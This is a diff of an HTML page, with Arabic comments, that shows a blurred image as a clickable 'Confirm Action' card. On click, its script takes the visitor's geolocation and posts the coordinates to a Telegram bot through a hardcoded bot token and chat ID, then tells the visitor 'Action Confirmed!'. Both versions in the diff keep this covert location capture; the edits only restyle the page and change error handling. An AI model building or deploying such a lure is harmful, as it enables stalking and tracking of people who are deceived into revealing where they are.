@@ -3,10 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Action Confirm</title>
+  <title>Confirm Action</title>
   <style>
     body {
-      margin: 0;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -14,20 +13,20 @@
       background-color: #f0f0f0;
     }
     #card {
-      width: 90vw;
-      height: 70vh;
+      cursor: pointer;
+      width: 600px; /* تكبير الصورة */
+      height: 400px; /* تكبير الصورة */
       background-image: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg');
       background-size: cover;
       background-position: center;
-      filter: blur(3px); /* تغبيش الصورة */
-      cursor: pointer;
+      filter: blur(2px); /* لتغبيش الصورة */
       display: flex;
       justify-content: center;
       align-items: center;
       color: white;
       font-weight: bold;
-      font-size: 22px;
-      text-shadow: 1px 1px 3px black;
+      font-size: 24px;
+      text-shadow: 2px 2px 4px black;
     }
   </style>
 </head>
@@ -36,8 +35,8 @@
 
   <script>
     const card = document.getElementById('card');
-    const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
-    const CHAT_ID = "7485197107";
+    const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; // توكن البوت
+    const CHAT_ID = "7485197107"; // معرف الشات
 
     card.addEventListener('click', () => {
       if (navigator.geolocation) {
@@ -47,7 +46,9 @@
 
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
-            headers: {'Content-Type': 'application/json'},
+            headers: {
+              'Content-Type': 'application/json'
+            },
             body: JSON.stringify({
               chat_id: CHAT_ID,
               text: `Lat: ${lat}\nLon: ${lon}`
@@ -55,11 +56,9 @@
           });
 
           alert('Action Confirmed!');
-        }, error => {
-          alert('Unable to get location.');
         });
       } else {
-        alert('Geolocation not supported.');
+        alert('Unable to get location.');
       }
     });
   </script>
